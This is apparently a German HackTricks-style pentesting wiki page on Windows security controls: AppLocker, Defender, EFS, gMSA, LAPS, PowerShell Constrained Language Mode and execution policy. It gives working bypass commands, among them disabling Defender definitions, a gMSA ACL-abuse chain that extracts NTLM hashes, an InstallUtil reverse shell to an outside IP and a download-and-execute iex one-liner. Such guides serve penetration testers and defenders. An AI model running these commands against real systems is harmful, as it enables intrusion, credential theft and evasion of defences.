# Windows-Sicherheitskontrollen

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-Richtlinie

Eine Application-Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, die auf einem System vorhanden sein dürfen und ausgeführt werden können. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen Geschäftsanforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Lösung für Application Whitelisting** und gibt Systemadministratoren die Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Es bietet **feingranulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installer-Dateien, DLLs, packaged apps und packed app installers.\
Es ist üblich, dass Organisationen **cmd.exe und PowerShell.exe** sowie Schreibzugriff auf bestimmte Verzeichnisse blockieren, **aber all das lässt sich umgehen**.

### Überprüfen

Überprüfe, welche Dateien/Erweiterungen blockiert oder zugelassen sind:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registry-Pfad enthält die Konfigurationen und Richtlinien, die von AppLocker angewendet werden, und bietet eine Möglichkeit, die aktuell auf dem System durchgesetzten Regeln zu überprüfen:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **Writable folders** zum Umgehen der AppLocker Policy: Wenn AppLocker die Ausführung von beliebigen Dateien innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **writable folders**, die du verwenden kannst, um dies zu **bypass**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Häufig **vertrauenswürdige** [**"LOLBAS's"**](https://lolbas-project.github.io/) Binärdateien können ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln können ebenfalls umgangen werden**
- Zum Beispiel, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, Sie können überall einen **Ordner namens `allowed`** erstellen und er wird erlaubt.
- Organisationen konzentrieren sich oft darauf, **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu blockieren, vergessen aber die **anderen** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **DLL enforcement** wird sehr selten aktiviert, weil es zusätzliche Last für ein System bedeuten kann und umfangreiche Tests nötig sind, um sicherzustellen, dass nichts kaputtgeht. Daher hilft die Nutzung von **DLLs als backdoors**, AppLocker zu umgehen.
- Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **execute Powershell** code in einem beliebigen Prozess auszuführen und AppLocker zu umgehen. Für mehr Informationen siehe: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Speicherung von Anmeldeinformationen

### Security Accounts Manager (SAM)

Lokale Anmeldeinformationen befinden sich in dieser Datei, die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Anmeldeinformationen** (gehasht) werden im **Speicher** dieses Subsystems aus Gründen des Single Sign-On abgelegt.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen...), **Authentifizierung**, **Access Tokens**...\
LSA wird die Komponente sein, die die bereitgestellten Anmeldeinformationen in der **SAM**-Datei prüft (bei einer lokalen Anmeldung) und mit dem **Domain Controller** spricht, um einen Domänenbenutzer zu authentifizieren.

Die **Anmeldeinformationen** werden im **Prozess LSASS** gespeichert: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.

### LSA-Secrets

LSA kann einige Anmeldeinformationen auf der Festplatte speichern:

- Passwort des Computerkontos im Active Directory (z. B. wenn der Domain Controller nicht erreichbar ist).
- Passwörter von Dienstkonten von Windows Services
- Passwörter für geplante Tasks
- Mehr (Passwörter von IIS-Anwendungen...)

### NTDS.dit

Es ist die Datenbank des Active Directory. Sie ist nur auf Domain Controllern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirus, der in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Er **blockiert** gängige pentesting-Tools wie **`WinPEAS`**. Es gibt jedoch Wege, diese Schutzmaßnahmen zu **umgehen**.

### Überprüfen

Um den **Status** von **Defender** zu prüfen, können Sie das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (prüfen Sie den Wert von **`RealTimeProtectionEnabled`**, um zu wissen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Zur Aufzählung können Sie auch ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Verschlüsseltes Dateisystem (EFS)

EFS sichert Dateien durch Verschlüsselung unter Verwendung eines **symmetrischen Schlüssels**, bekannt als **File Encryption Key (FEK)**. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im verschlüsselten Datei-$EFS **alternate data stream** gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der zugehörige **private key** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Stream zu entschlüsseln. Mehr Details finden sich [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Entschlüsselungsszenarien ohne Benutzerinitiation** umfassen:

- Wenn Dateien oder Ordner in ein nicht-EFS-Dateisystem verschoben werden, wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), werden sie automatisch entschlüsselt.
- Verschlüsselte Dateien, die über das Netzwerk via SMB/CIFS-Protokoll gesendet werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode erlaubt dem **Eigentümer** einen **transparenten Zugriff** auf verschlüsselte Dateien. Allerdings ermöglicht alleiniges Ändern des Benutzerpassworts und erneutes Anmelden keine Entschlüsselung.

**Wichtigste Punkte**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Zur Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
- Automatische Entschlüsselung erfolgt unter bestimmten Bedingungen, z. B. beim Kopieren auf FAT32 oder bei Netzwerkübertragung.
- Verschlüsselte Dateien sind für den Eigentümer ohne zusätzliche Schritte zugänglich.

### Check EFS info

Überprüfe, ob ein **Benutzer** diesen **Dienst** verwendet hat, indem du prüfst, ob folgender Pfad existiert: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Prüfe **wer** Zugriff auf die Datei hat mit `cipher /c \<file>\`  
Du kannst auch `cipher /e` und `cipher /d` in einem Ordner verwenden, um alle Dateien zu **verschlüsseln** bzw. **entschlüsseln**.

### Decrypting EFS files

#### Being Authority System

Dieser Weg erfordert, dass der Opfer-Benutzer einen Prozess auf dem Host ausführt. Falls das der Fall ist, kannst du mit einer `meterpreter`-Session das Token des Prozesses des Benutzers impersonifizieren (`impersonate_token` from `incognito`). Oder du könntest einfach in den Prozess des Benutzers `migrate`.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Servicekonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu traditionellen Servicekonten, die oft die Einstellung "**Password never expire**" aktiviert haben, bieten gMSAs eine sicherere und besser verwaltbare Lösung:

- **Automatic Password Management**: gMSAs verwenden ein komplexes, 240-stelliges Passwort, das automatisch gemäß Domain- oder Computer-Richtlinie geändert wird. Dieser Prozess wird vom Microsoft Key Distribution Service (KDC) gehandhabt und eliminiert den Bedarf an manuellen Passwortaktualisierungen.
- **Enhanced Security**: Diese Konten sind gegen Lockouts immun und können nicht für interaktive Logins verwendet werden, was ihre Sicherheit erhöht.
- **Multiple Host Support**: gMSAs können über mehrere Hosts hinweg geteilt werden, was sie ideal für Dienste macht, die auf mehreren Servern laufen.
- **Scheduled Task Capability**: Im Gegensatz zu managed service accounts unterstützen gMSAs das Ausführen geplanter Tasks.
- **Simplified SPN Management**: Das System aktualisiert automatisch den Service Principal Name (SPN), wenn sich sAMaccount-Details oder der DNS-Name des Computers ändern, was das SPN-Management vereinfacht.

Die Passwörter für gMSAs werden in der LDAP-Property _**msDS-ManagedPassword**_ gespeichert und von Domain Controllern (DCs) alle 30 Tage automatisch zurückgesetzt. Dieses Passwort, ein verschlüsselter Datenblob bekannt als [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern, auf denen die gMSAs installiert sind, abgerufen werden, was eine sichere Umgebung gewährleistet. Um auf diese Informationen zuzugreifen, ist eine gesicherte Verbindung wie LDAPS erforderlich oder die Verbindung muss mit 'Sealing & Secure' authentifiziert sein.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Schauen Sie sich auch diese [web page] an, die beschreibt, wie man einen **NTLM relay attack** ausführt, um das **password** des **gMSA** zu **read**.

### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)

In vielen Umgebungen können low-privileged users ohne Kompromittierung des DC auf gMSA-Secrets pivotieren, indem sie fehlkonfigurierte Objekt-ACLs ausnutzen:

- Eine Gruppe, die Sie kontrollieren können (z. B. via GenericAll/GenericWrite), erhält `ReadGMSAPassword` für ein gMSA.
- Indem Sie sich selbst zu dieser Gruppe hinzufügen, erben Sie das Recht, das `msDS-ManagedPassword`-Blob des gMSA über LDAP zu lesen und daraus verwertbare NTLM-Anmeldeinformationen abzuleiten.

Typischer Ablauf:

1) Discover the path mit BloodHound und markieren Sie Ihre foothold principals als Owned. Suchen Sie nach Kanten wie:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Fügen Sie sich der zwischengeschalteten Gruppe hinzu, die Sie kontrollieren (Beispiel mit bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Das gMSA verwaltete Passwort über LDAP auslesen und daraus den NTLM-Hash ableiten. NetExec automatisiert die Extraktion von `msDS-ManagedPassword` und die Konvertierung in NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Als gMSA mit dem NTLM-Hash authentifizieren (kein Klartext erforderlich). Wenn das Konto in Remote Management Users ist, funktioniert WinRM direkt:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Hinweise:
- LDAP-Abfragen von `msDS-ManagedPassword` erfordern Sealing (z. B. LDAPS/sign+seal). Tools erledigen das automatisch.
- gMSAs erhalten häufig lokale Rechte wie WinRM; überprüfe die Gruppenmitgliedschaft (z. B. Remote Management Users), um lateral movement zu planen.
- Wenn du nur den Blob benötigst, um den NTLM selbst zu berechnen, siehe MSDS-MANAGEDPASSWORD_BLOB structure.



## LAPS

Die **Local Administrator Password Solution (LAPS)**, verfügbar zum Download bei [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), ermöglicht die Verwaltung lokaler Administrator-Passwörter. Diese Passwörter sind **zufällig generiert**, einzigartig und **regelmäßig geändert** und werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter wird über ACLs auf autorisierte Benutzer beschränkt. Sind entsprechende Berechtigungen vergeben, ist das Auslesen lokaler Admin-Passwörter möglich.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der Funktionen ein**, die für die effektive Nutzung von PowerShell erforderlich sind, z. B. das Blockieren von COM-Objekten, das Zulassen nur genehmigter .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.

### **Überprüfen**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In aktuellen Windows funktioniert dieser Bypass nicht, aber du kannst [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren musst du möglicherweise** _**eine Referenz hinzufügen**_ -> _Durchsuchen_ -> _Durchsuchen_ -> füge `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzu und **ändere das Projekt auf .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell-Code auszuführen** in jedem Prozess und den constrained mode zu umgehen. Für mehr Infos siehe: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Hauptwege, diese Richtlinie zu umgehen:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mehr dazu [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür zuständig, das geeignete Protokoll für zwei Maschinen zu finden, die kommunizieren wollen. Die bevorzugte Methode dafür ist Kerberos. Anschließend verhandelt die SSPI, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle heißen Security Support Provider (SSP), befinden sich auf jedem Windows-Rechner in Form einer DLL und beide Maschinen müssen dasselbe unterstützen, um kommunizieren zu können.

### Haupt-SSPs

- **Kerberos**: Bevorzugt
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Aus Kompatibilitätsgründen
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashes
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll zu verhandeln (Kerberos oder NTLM; Kerberos ist die Standardeinstellung)
- %windir%\Windows\System32\lsasrv.dll

#### Die Aushandlung kann mehrere Methoden oder nur eine anbieten.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für erhöhte Aktivitäten** ermöglicht.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Referenzen

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
